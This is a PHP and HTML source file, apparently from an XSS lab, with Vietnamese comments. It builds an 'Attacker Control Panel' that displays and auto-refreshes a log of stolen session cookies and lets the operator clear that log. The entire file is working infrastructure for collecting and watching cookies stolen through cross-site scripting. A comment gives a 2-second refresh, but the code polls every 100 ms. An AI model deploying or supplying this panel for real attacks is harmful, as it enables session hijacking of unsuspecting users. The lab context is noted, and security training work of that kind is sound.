<?php
// Xử lý yêu cầu lấy nội dung file qua AJAX (phải đặt ở đầu file)
if (isset($_GET['ajax'])) {
    if (file_exists('stolen_cookies.txt')) {
        $content = file_get_contents('stolen_cookies.txt');
        echo ($content === '') ? "No cookies stolen yet..." : htmlspecialchars($content);
    } else {
        echo "Log file not found.";
    }
    exit; // Dừng thực thi sau khi trả về dữ liệu AJAX
}

// Xử lý Clear Logs
if (isset($_POST['clear'])) {
    file_put_contents('stolen_cookies.txt', '');
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Attacker Dashboard</title>
    <style>
        body {
            font-family: 'Courier New', monospace; /* Nhìn chuyên nghiệp hơn */
            background: #111;
            color: #0f0;
            padding: 20px;
        }

        .log-box {
            background: #000;
            border: 1px solid #0f0;
            padding: 15px 20px;
            height: 450px;
            overflow-y: auto;
            white-space: pre-line;
            word-break: break-word;
            line-height: 1.6;
            border-radius: 6px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
        }

        h1 { border-bottom: 1px solid #0f0; padding-bottom: 10px; }
        
        .status-bar {
            margin-bottom: 10px;
            font-size: 0.9em;
            color: #888;
        }

        .payload {
            background: #222;
            padding: 10px;
            border-left: 5px solid #f00;
            margin-bottom: 20px;
        }

        button {
            background: #440000;
            color: #fff;
            border: 1px solid #f00;
            padding: 8px 15px;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { background: #f00; }
    </style>
</head>
<body>
    <h1>Attacker Control Panel</h1>
    
    <div class="payload">
        <h3>Target: XSS Lab</h3>
        <p>Status: <span style="color: #0f0;">Monitoring...</span></p>
    </div>

    <h3>Stolen Cookies Log:</h3>
    <div class="status-bar" id="last-update">Last update: Checking...</div>
    
    <div class="log-box" id="log-content">Loading logs...</div>
    
    <form method="POST" style="margin-top: 15px;">
        <button type="submit" name="clear">Clear All Logs</button>
    </form>

    <script>
        const logBox = document.getElementById('log-content');
        const statusTime = document.getElementById('last-update');

        function updateLogs() {
            // Sử dụng Fetch API để lấy dữ liệu từ tham số ?ajax=1
            fetch('?ajax=1')
                .then(response => response.text())
                .then(data => {
                    // Chỉ cập nhật nếu nội dung có sự thay đổi để tránh nháy màn hình
                    if (logBox.innerHTML !== data) {
                        logBox.innerHTML = data;
                        // Tự động cuộn xuống cuối khi có dữ liệu mới
                        logBox.scrollTop = logBox.scrollHeight;
                    }
                    statusTime.innerText = "Last update: " + new Date().toLocaleTimeString();
                })
                .catch(err => {
                    console.error('Error fetching logs:', err);
                    statusTime.innerText = "Connection lost...";
                });
        }

        // Cập nhật mỗi 2 giây (2000ms)
        setInterval(updateLogs, 100);

        // Chạy ngay lập tức khi load trang lần đầu
        updateLogs();
    </script>
</body>
</html>